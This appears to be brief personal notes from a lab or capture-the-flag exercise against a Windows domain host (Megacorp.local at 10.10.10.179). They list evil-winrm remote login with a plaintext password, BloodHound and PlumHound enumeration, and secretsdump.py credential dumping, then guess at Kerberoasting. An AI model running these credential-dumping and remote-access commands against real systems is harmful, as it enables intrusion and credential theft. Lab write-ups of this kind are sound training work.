
```
evil-winrm -u 'sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179
```

![[Pasted image 20241002141912.png]]

![[Pasted image 20241002142112.png]]

![[Pasted image 20241002142511.png]]

![[Pasted image 20241002142528.png]]

```
bloodhound-python -d Megacorp.local -u sbauer -p 'D3veL0pM3nT!' -ns 10.10.10.179  -c all
```

![[Pasted image 20241002142806.png]]

```
secretsdump.py Megaccorp.local/sbauer:'D3veL0pM3nT!'@10.10.10.179
```
![[Pasted image 20241002142952.png]]

Will run PlumHound
```
python3 Plumhound.py -x tasks/default.tasks -p password
```

![[Pasted image 20241002155625.png]]

Open the index.html

![[Pasted image 20241002160246.png]]

SO i think there is something related to Kerberoasting


